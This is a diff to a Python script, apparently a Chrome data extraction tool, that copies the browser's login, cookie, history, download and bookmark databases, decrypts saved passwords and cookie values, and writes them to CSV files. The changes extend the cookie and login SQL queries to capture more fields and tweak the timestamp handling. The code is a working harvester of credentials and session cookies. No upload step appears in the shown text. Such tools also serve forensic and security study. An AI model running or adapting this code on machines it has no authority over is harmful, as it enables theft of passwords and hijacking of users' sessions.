@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# v0.3
+# v0.5
 
 import os
 import re
@@ -51,6 +51,12 @@ def decrypt_value_all_version(encrypted_value):
 def timeStamp2time(timestamp):
     timestamp = timestamp // 1000000 - 11644473600
     if timestamp > 0:
+        # print(timestamp)
+        # print(len(str(timestamp)))
+        if len(str(timestamp)) > 10:
+            timestamp = timestamp / 1000
+        else:
+            pass
         timeArray = time.localtime(timestamp)
         otherStyleTime = time.strftime("%Y-%m-%d %H:%M:%S", timeArray)
         return otherStyleTime
@@ -70,8 +76,6 @@ def read_db(csv_path, csv_head, sql):
                 for i in range(0, len(csv_head)):
                     if isinstance(r[i], int) and r[i] > 10000000000000000:
                         data.append((timeStamp2time(r[i])))
-                    elif isinstance(r[i], int) and r[i] < 10000000000000000:
-                        data.append(r[i]/1024)
                     elif isinstance(r[i], bytes):
                         data.append(decrypt_value_all_version(r[i]))
                     else:
@@ -80,6 +84,7 @@ def read_db(csv_path, csv_head, sql):
                 data = []
             return 0
         except Exception as e:
+            raise e
             return 1
     cursor.close()
     conn.close()
@@ -100,7 +105,6 @@ def get_data(db_path, csv_path, csv_head, sql):
 
 def get_json_data(json_path, csv_path, csv_head):
     target_json = os.environ['USERPROFILE'] + os.sep + json_path
-    # target_json = r"C:\Users\Aquilao\Desktop\Bookmarks"
     shutil.copy2(target_json, "temp")
     print("[+] Get Chrome Data From " + target_json)
     with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
@@ -143,19 +147,19 @@ def main():
     # Csv File Head
     CSV_FILE_HEAD = {
         "PASSOWRDS_CSV_HEAD" : ["url", "username", "password"],
-        "COOKIES_CSV_HEAD"   : ["domain", "name", "cookies"],
+        "COOKIES_CSV_HEAD"   : ["domain", "name", "cookies", "path", "is secure", "is httponly", "creation utc", "expires utc", "last access"],
         "HISTORY_CSV_HEAD"   : ["url", "title", "visit count", "last visit time"],
-        "DOWNLOADS_CSV_HEAD" : ["target path", "url", "size(KB)", "start time", "end time"],
+        "DOWNLOADS_CSV_HEAD" : ["target path", "url", "size(byte)", "start time", "end time"],
         "BOOKMARKS_CSV_HEAD" : ["site name", "url", "create time"]
     }
     # Sql
     SQL = {
-        "LOGIN_DATA_SQL" : "SELECT origin_url, username_value, password_value FROM logins;",
-        "COOKIES_SQL"    : "SELECT host_key, name, encrypted_value FROM cookies;",
+        "LOGIN_DATA_SQL" : "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;",
+        "COOKIES_SQL"    : "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
         "HISTORY_SQL"    : "SELECT url, title, visit_count, last_visit_time FROM urls;",
         "DOWNLOADS_SQL"  : "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
     }
-    # Get Chrome Password
+    # Get Chrome Passwords
     get_data(TARGET_FILE_PATH["CHROME_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["CHROME_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"])
     # Get Chrome Cookies
     get_data(TARGET_FILE_PATH["CHROME_COOKIES_DB_PATH"], RESULT_FILE_PATH["CHROME_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"])
